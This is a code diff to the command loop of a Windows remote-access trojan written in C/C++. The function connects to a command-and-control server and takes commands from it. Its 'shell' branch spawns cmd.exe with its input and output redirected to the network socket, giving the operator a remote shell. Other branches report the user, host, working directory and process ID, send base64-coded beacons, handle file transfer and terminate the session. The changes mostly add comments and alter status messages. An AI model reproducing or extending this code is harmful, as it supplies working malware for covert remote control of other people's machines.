@@ -122,20 +122,24 @@ void RAT(char* C2_Server, int C2_Port)
                 // Should only be used in individual interactive environments == TBC
                 if ((strcmp(command, "shell") == 0))
                 {
+                    // Load CMD.EXE as a process var
                     char Process[] = "cmd.exe";
                     STARTUPINFO sinfo;
                     PROCESS_INFORMATION pinfo;
 
+                    // Allocate and execute
                     memset(&sinfo, 0, sizeof(sinfo));
                     sinfo.cb = sizeof(sinfo);
-                    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-                    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) tcp_sock;
+                    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);                  // Set flags
+                    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) tcp_sock;       // Redirect fd's to socket
 
+                    // Create process and attach the process var to it
                     CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
 
                     // We are here, hanging in the cmd.exe process until it is closed by a TERM or exit command
                     WaitForSingleObject(pinfo.hProcess, INFINITE); 
 
+                    // Cleanup correctly
                     CloseHandle(pinfo.hProcess);
                     CloseHandle(pinfo.hThread);
 
@@ -143,54 +147,74 @@ void RAT(char* C2_Server, int C2_Port)
 
                     // When the process exits, we send an agent-msg over to alert the C2
                     char buffer[64] = "";
-                    strcat(buffer,"[* Agent-Msg] Exiting shell\n");
+                    strcat(buffer,"Exiting shell\n");
+
+                    // Send message
                     send(tcp_sock,buffer,strlen(buffer) + 1, 0);
 
+                    // Clear buffers
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
                 else if ((strcmp(command, "UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt") == 0))
                 {
+                    // Load OS type into buffer
                     char buffer[257] = "";
                     strcat(buffer, "Windows");
                     //strcat(buffer, "\n");
+
+                    // Send message
                     send(tcp_sock, buffer, strlen(buffer) + 1, 0);
 
+                    // Clear buffers
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
                 else if ((strcmp(command, "whoami") == 0))
                 {
+                    // Load buffer, exec Whoami function and load output into buffer
                     char buffer[257] = "";
                     whoami(buffer, 257);
                     strcat(buffer, "\n");
+
+                    // send message
                     send(tcp_sock, buffer, strlen(buffer) + 1, 0);
 
+                    // Clear buffers
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
                 else if ((strcmp(command, "hostname") == 0))
                 {
+                    // Load buffer, exec Hostname function
                     char buffer[257] = "";
                     hostname(buffer, 257);
                     strcat(buffer, "\n");
+
+                    // Send message
                     send(tcp_sock, buffer, strlen(buffer) + 1, 0);
 
+                    // Clear buffers
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
                 else if ((strcmp(command, "pwd") == 0))
                 {
+                    // Load buffer, exec PrintWorkingDirectory (PWD) function
                     char buffer[257] = "";
                     pwd(buffer, 257);
                     strcat(buffer, "\n");
+
+                    // Send message
                     send(tcp_sock, buffer, strlen(buffer) + 1, 0);
 
+                    // Clear buffers
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
                 else if ((strcmp(command, "getpid") == 0))
                 {   
+                    // Exec function, load output into var
                     DWORD pid;
                     char char_pid[6];
                     pid = getpid();
@@ -198,35 +222,49 @@ void RAT(char* C2_Server, int C2_Port)
                     // Convert DWORD to char (using base 10)
                     _ultoa(pid,char_pid,10);
 
+                    // Load message
                     char buffer[20] = "";
                     strcat(buffer, "Current PID: ");
                     strcat(buffer, char_pid);
                     strcat(buffer, "\n");
+
+                    // Send message
                     send(tcp_sock, buffer, strlen(buffer) + 1, 0);
 
+                    // Clear buffers
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
                 else if (strcmp(command, "ping") == 0)
                 {
+                    // Send intelligent reply
                     char buffer[64] = "";
-                    strcat(buffer,"[*Agent-msg] PONG\n");
+                    strcat(buffer,"PONG\n");
                     send(tcp_sock,buffer,strlen(buffer) + 1, 0);
 
+                    // Clear buffers
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
 			    }
                 else if (strcmp(command, "beacon") == 0)
                 {
+                    // Send beacon string to show success
                     char buffer[128] = "";
                     strcat(buffer,"d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy");
                     send(tcp_sock,buffer,strlen(buffer) + 1, 0);
 
+                    // Clear buffers
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
 			    }
                 else if (strcmp(command, "exit") == 0)
                 {
+                    // Send return code - OK
+                    char buffer[64] = "";
+                    strcat(buffer,"c2xlZXBpbmc");
+                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);
+
+                    // Close connection, Kill process
                     closesocket(tcp_sock);
                     WSACleanup();
                     std::cout << "Socket killed. WSA Cleaned. Sleep Start" << std::endl;
@@ -236,6 +274,10 @@ void RAT(char* C2_Server, int C2_Port)
                 }
                 else if (strcmp(command, "kill") == 0) 
                 {
+                    char buffer[64] = "";
+                    strcat(buffer,"ZGVhZA");
+                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);
+
                     closesocket(tcp_sock);
                     WSACleanup();
                     std::cout << "Socket killed. WSA Cleaned. Sleep Start" << std::endl;
@@ -298,17 +340,19 @@ void RAT(char* C2_Server, int C2_Port)
                     // Send result info
                     send(tcp_sock,buffer,strlen(buffer)+1,0);
 
-                    // clear buffers
+                    // Clear buffers
                     memset(base64file, 0, sizeof(base64file));
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived)); 
                 }
                 else
                 {
+                    // Send notice of validity
                     char buffer[64] = "";
-                    strcat(buffer,"[* Agent-Msg] Invalid Command\n");
+                    strcat(buffer,"Invalid Command\n");
                     send(tcp_sock,buffer,strlen(buffer) + 1, 0);
 
+                    // Clear buffers
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
